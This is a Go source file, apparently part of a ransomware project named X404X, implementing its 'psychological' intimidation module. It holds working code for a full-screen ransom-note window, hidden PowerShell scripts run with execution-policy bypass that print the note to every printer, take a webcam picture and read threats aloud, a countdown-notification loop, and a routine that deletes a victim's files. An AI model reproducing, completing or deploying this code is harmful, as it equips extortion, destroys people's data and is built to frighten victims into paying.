package ransomware

import (
	"fmt"
	"os"
	"os/exec"
	"runtime"
	"strings"
	"time"
)

type PsychologicalEngine struct {
	config  *RansomwareConfig
	payload *PsychologicalPayload
}

func NewPsychologicalEngine(cfg *RansomwareConfig) *PsychologicalEngine {
	return &PsychologicalEngine{
		config: cfg,
		payload: &PsychologicalPayload{
			ShowCountdown:    true,
			DeleteFilesLive:  true,
			PlaySound:        true,
			CaptureWebcam:    false,
			RecordAudio:      false,
			PrintRansomNote:  true,
			DurationSeconds:  300,
		},
	}
}

func (pe *PsychologicalEngine) DeployTerror() error {
	if pe.config.Simulation || !pe.config.PsychologicalTerror {
		return nil
	}

	if pe.payload.PrintRansomNote {
		if err := pe.printToAllPrinters(); err != nil {
			return fmt.Errorf("printer: %w", err)
		}
	}

	if pe.payload.CaptureWebcam {
		if err := pe.captureWebcam(); err != nil {
			return fmt.Errorf("webcam: %w", err)
		}
	}

	if pe.payload.RecordAudio {
		if err := pe.recordAudio(); err != nil {
			return fmt.Errorf("audio: %w", err)
		}
	}

	return nil
}

func (pe *PsychologicalEngine) DeployRansomwareUI(companyName string) error {
	if pe.config.Simulation {
		return nil
	}

	noteLines := []string{
		"╔══════════════════════════════════════════╗",
		"║           X404X RANSOMWARE              ║",
		"║                                          ║",
		fmt.Sprintf("║  Company: %-30s  ║", companyName),
		"║  Status: ENCRYPTED + DATA STOLEN        ║",
		fmt.Sprintf("║  Deadline: %d hours                    ║", pe.config.DeadlineHours),
		"║                                          ║",
		"║  Your files are encrypted.              ║",
		"║  Your data has been exfiltrated.        ║",
		"║  Your backups are destroyed.            ║",
		"║                                          ║",
		"║  Contact us on Tor to negotiate.        ║",
		"║  Every hour, 100 random files are       ║",
		"║  permanently deleted.                   ║",
		"║                                          ║",
		"║  TICK... TOCK...                        ║",
		"╚══════════════════════════════════════════╝",
	}
	note := strings.Join(noteLines, "\n")

	if runtime.GOOS == "windows" {
		pe.showWindowsAlert(note)
	} else {
		pe.showLinuxAlert(note)
	}

	return nil
}

func (pe *PsychologicalEngine) showWindowsAlert(message string) {
	escaped := strings.ReplaceAll(message, `"`, "'")
	psScript := fmt.Sprintf(`
Add-Type -AssemblyName System.Windows.Forms
$form = New-Object Windows.Forms.Form
$form.Text = "X404X - CRITICAL ALERT"
$form.WindowState = "Maximized"
$form.TopMost = $true
$form.ControlBox = $false
$form.BackColor = "Black"
$form.FormBorderStyle = "None"

$label = New-Object Windows.Forms.Label
$label.Text = @"%s"@
$label.ForeColor = "Red"
$label.Font = New-Object Drawing.Font("Consolas", 14, [Drawing.FontStyle]::Bold)
$label.AutoSize = $true
$label.TextAlign = "MiddleCenter"

$form.Controls.Add($label)
$form.ShowDialog()
`, escaped)

	scriptPath := os.TempDir() + "\\x404x_alert.ps1"
	os.WriteFile(scriptPath, []byte(psScript), 0644)
	exec.Command("powershell", "-WindowStyle", "Hidden", "-ExecutionPolicy", "Bypass", "-File", scriptPath).Start()
}

func (pe *PsychologicalEngine) showLinuxAlert(message string) {
	zenity := exec.Command("zenity", "--warning", "--text="+message, "--title=X404X ALERT")
	if err := zenity.Start(); err != nil {
		xdg := exec.Command("xmessage", "-center", message)
		xdg.Start()
	}

	go pe.countdownLoop()
}

func (pe *PsychologicalEngine) countdownLoop() {
	for i := pe.config.DeadlineHours * 60; i > 0; i-- {
		msg := fmt.Sprintf("X404X — %d minutes remaining. Pay or data is published.", i)
		if runtime.GOOS == "linux" {
			exec.Command("notify-send", "X404X WARNING", msg).Start()
		}
		time.Sleep(60 * time.Second)
	}
}

func (pe *PsychologicalEngine) printToAllPrinters() error {
	if runtime.GOOS != "windows" {
		return nil
	}

	ransomNote := "YOUR NETWORK HAS BEEN COMPROMISED.\nALL FILES ENCRYPTED. ALL DATA STOLEN.\nCONTACT: http://x404x.onion/negotiate\nDO NOT IGNORE."

	psScript := fmt.Sprintf(`
$printers = Get-Printer
foreach ($printer in $printers) {
	Write-Output "%s" | Out-Printer -Name $printer.Name
}`, strings.ReplaceAll(ransomNote, "\n", "`n"))

	scriptPath := os.TempDir() + "\\x404x_print.ps1"
	os.WriteFile(scriptPath, []byte(psScript), 0644)
	exec.Command("powershell", "-WindowStyle", "Hidden", "-ExecutionPolicy", "Bypass", "-File", scriptPath).Start()

	return nil
}

func (pe *PsychologicalEngine) captureWebcam() error {
	if runtime.GOOS != "windows" {
		return nil
	}

	psScript := `
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

try {
	$deviceManager = New-Object -ComObject WIA.DeviceManager
	$device = $deviceManager.DeviceInfos | Where-Object {$_.Type -eq 2} | Select-Object -First 1
	if ($device) {
		$deviceInfo = $device.Connect()
		$item = $deviceInfo.Items[1]
		$imageFile = $item.Transfer("{B96B3CAB-0728-11D3-9D7B-0000F81EF32E}")
		$path = "$env:TEMP\x404x_shot.jpg"
		$imageFile.SaveFile($path)
	}
} catch {}
`

	scriptPath := os.TempDir() + "\\x404x_cam.ps1"
	os.WriteFile(scriptPath, []byte(psScript), 0644)
	exec.Command("powershell", "-WindowStyle", "Hidden", "-ExecutionPolicy", "Bypass", "-File", scriptPath).Start()

	return nil
}

func (pe *PsychologicalEngine) recordAudio() error {
	if runtime.GOOS != "windows" {
		return nil
	}

	psScript := `
Add-Type -AssemblyName System.Speech
$speech = New-Object System.Speech.Synthesis.SpeechSynthesizer
$speech.Volume = 100
$speech.Rate = -5
$voices = $speech.GetInstalledVoices()
if ($voices.Count -gt 1) {
	$speech.SelectVoice($voices[1].VoiceInfo.Name)
}
$message = @"
ATTENTION. Your network has been compromised. All files have been encrypted.
Your sensitive data has been exfiltrated. Pay the ransom immediately or face destruction.
This is X404X. You have been warned.
"@
$speech.Speak($message)
$speech.Dispose()
`

	scriptPath := os.TempDir() + "\\x404x_tts.ps1"
	os.WriteFile(scriptPath, []byte(psScript), 0644)
	exec.Command("powershell", "-WindowStyle", "Hidden", "-ExecutionPolicy", "Bypass", "-File", scriptPath).Start()

	return nil
}

func (pe *PsychologicalEngine) DeleteRandomFiles(root string, count int) (int, error) {
	if pe.config.Simulation {
		return 0, nil
	}

	deleted := 0
	entries, err := os.ReadDir(root)
	if err != nil {
		return 0, err
	}

	for _, entry := range entries {
		if deleted >= count {
			break
		}
		if !entry.IsDir() {
			path := root + string(os.PathSeparator) + entry.Name()
			os.Remove(path)
			deleted++
		}
	}

	return deleted, nil
}
